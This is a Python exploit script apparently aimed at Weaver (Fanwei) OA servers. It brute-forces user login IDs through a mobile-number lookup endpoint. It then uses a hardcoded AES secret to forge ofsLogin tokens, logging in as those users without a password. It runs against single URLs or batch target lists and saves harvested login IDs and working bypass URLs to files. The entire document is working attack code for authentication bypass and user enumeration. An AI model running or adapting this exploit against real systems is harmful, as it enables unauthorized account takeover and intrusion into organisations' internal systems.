#utf-8
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from urllib.parse import urlparse
import argparse
import hashlib
import binascii
import requests
import operator
import json
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

header = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "accept": "*/*",
    "accept-encoding": "*",
    "keep-alive": "timeout=15, max=1000",
    "cache-control": "max-age=0"
    }


#from https://github.com/ruisika/weaver_Aul/blob/master/fanweiaes.py
class SHA1PRNG:
    def __init__(self, seed):
        self.seed = seed
        self.digest = hashlib.sha1(seed).digest()

    def next_bytes(self, num_bytes):
        result = bytearray()
        while len(result) < num_bytes:
            self.digest = hashlib.sha1(self.digest).digest()
            result.extend(self.digest)
        return bytes(result[:num_bytes])

def init_secret_key(key):
    prng = SHA1PRNG(key.encode())
    return prng.next_bytes(16)

def encrypt(data, key):
    cipher = AES.new(init_secret_key(key), AES.MODE_ECB)
    encrypted_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    return binascii.hexlify(encrypted_bytes).decode().lower()

def AEScode(loginId):
    receiver = str(loginId)
    timestamp = "2"
    syscode = "IM"
    secretkey = "u6skkR"
    encodeAuth = encrypt(receiver + timestamp, syscode + secretkey)
    return encodeAuth

#loginId brute and test ofsLogin
def getloginid_ofsLogin(url,mobile,i):
    global isall,idcount
    mobile = mobile + str(i)
    # print(mobile)
    try:
        response = requests.get(url+"/mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile="+mobile,headers=header,verify=False,timeout=5)
    except requests.RequestException:
        return 1
    # print(response)
    # print(response.text)
    if not operator.contains(response.text,'"status":"1"') and not operator.contains(response.text,'"status":"0"') and not operator.contains(response.text,'"status":"-1"'):
        return 1

    if not operator.contains(response.text,"status"):
        return 1
    if operator.contains(response.text,"/images/error/404.png") or response.status_code != 200:
        return 1
    if operator.contains(response.text,'"status":"1"') and not operator.contains(response.text,'loginId'):
        return 1
    if operator.contains(response.text,"loginId"):
        loginId = json.loads(response.text).get("loginId")
        print('\033[0;91;107mloginId: '+loginId+'\033[0m')
        f = open('loginid.txt', 'a')
        f.write(loginId+"\n")
        f.flush()
        f.close()
        authcode = AEScode(loginId)
        authurl = url+"/mobile/plugin/1/ofsLogin.jsp?syscode=IM&timestamp=2&gopage=/wui/index.html&receiver="+loginId+"&loginTokenFromThird="+authcode 
        try:
            response = requests.get(authurl,headers=header,verify=False)
        except requests.RequestException:
            return 1  
        if operator.contains(response.text,"/wui/index.html"):
            print('\033[0;31;107mofsLogin_Vul: '+authurl+'\033[0m')
            f = open('result.txt', 'a')
            f.write(authurl+"\n")
            f.flush()
            f.close()
            if not isall and len(loginId) != 0:
                # print(loginId)
                return 2
        else:
            if not isall:
                if re.match(u"[\u4e00-\u9fa5]+",loginId) == None:
                    if len(loginId) != 0:
                        return 2
                else:
                    if idcount == 10:
                        return 2
                    else:
                        idcount = idcount + 1

        return 0
    if operator.contains(response.text,'"status":"-1"'):
        return 0
    for i in range(10):
        status = getloginid_ofsLogin(url,mobile,i)
        if(status == 0):
            continue
        elif(status == 2):
            return 2

#brute ofsLogin by loginId
def bruteOfsLogin(url,loginId):
    # print(loginId)
    authcode = AEScode(loginId)
    authurl = url+"/mobile/plugin/1/ofsLogin.jsp?syscode=IM&timestamp=2&gopage=/wui/index.html&receiver="+loginId+"&loginTokenFromThird="+authcode
    try:
        response = requests.get(authurl,headers=header,verify=False)
    except requests.RequestException:
        return 1
    if operator.contains(response.text,"/wui/index.html"):
        print('\033[0;91;107mloginId: '+loginId+'\033[0m')
        print('\033[0;31;107mofsLogin_Vul: '+authurl+'\033[0m')
        f = open('result.txt', 'a')
        f.write(authurl+"\n")
        f.flush()
        f.close()

#brute loginId
def bruteLoginid(url,mobile,i):
    mobile = mobile + str(i)
    try:
        response = requests.get(url+"/mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile="+mobile,headers=header,verify=False,timeout=5)
    except requests.RequestException:
        return 1
    if not operator.contains(response.text,'"status":"1"') and not operator.contains(response.text,'"status":"0"') and not operator.contains(response.text,'"status":"-1"'):
        return 1

    if not operator.contains(response.text,"status"):
        return 1
    if operator.contains(response.text,"/images/error/404.png") or response.status_code != 200:
        return 1
    if operator.contains(response.text,'"status":"1"') and not operator.contains(response.text,'loginId'):
        return 1
    if operator.contains(response.text,"loginId"):
        loginId = json.loads(response.text).get("loginId")
        print('\033[1;91;107mloginId: '+loginId+'\033[0m')
        f = open('loginid.txt', 'a')
        f.write(loginId+"\n")
        f.flush()
        f.close()
        return 0
    if operator.contains(response.text,'"status":"-1"'):
        return 0
    for i in range(10):
        status = getloginid_ofsLogin(url,mobile,i)
        if(status == 0):
            continue
        elif(status == 2):
            return 2
    


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", help = "目标URL")
    parser.add_argument('-f', "--file", help = "批量url文件")
    parser.add_argument('-l', "--loginIdFile", help = "loginId文件")
    parser.add_argument("--all", action='store_true',help = "是否遍历全部loginId")
    parser.add_argument("--brute", action='store_true',help = "是否进行爆破")
    parser.add_argument("--loginId", action='store_true',help = "爆破loginId")
    parser.add_argument("--ofsLogin", action='store_true',help = "爆破ofsLogin")
    args = parser.parse_args()

    isall = True

    if args.brute:
        if args.ofsLogin:
            if args.url:
                print('\033[0;31;46m开始测试'+args.url+'\033[0m')    
                for loginId in open(args.loginIdFile):
                    bruteOfsLogin(args.url,loginId.strip())
            elif args.file:
                for url in open(args.file):
                    print('\033[0;31;46m开始测试'+url.strip()+'\033[0m')  
                    for loginId in open(args.loginIdFile):
                        bruteOfsLogin(url.strip(),loginId.strip())
        elif args.loginId:
            if args.url:
                print('\033[0;31;46m开始测试'+args.url+'\033[0m')  
                for i in range(10):
                    status = bruteLoginid(args.url,"",i)
                    if status == 1 or status == 2:
                        break
            elif args.file:
                for url in open(args.file):
                    print('\033[0;31;46m开始测试'+url.strip()+'\033[0m')
                    for i in range(10):
                        status = bruteLoginid(url.strip(),"",i)
                        if status == 1 or status == 2:
                            break
    else:
        if args.url:
            print('\033[0;31;46m开始测试'+args.url+'\033[0m')
            for i in range(10):
                getloginid_ofsLogin(args.url,"",i)
        elif args.file:
            if not args.all:
                isall = False
            for url in open(args.file):
                idcount = 0
                print('\033[0;31;46m开始测试'+url.strip()+'\033[0m')
                for i in range(10):
                    status = getloginid_ofsLogin(url.strip(),"",i)
                    if status == 1 or status == 2:
                        break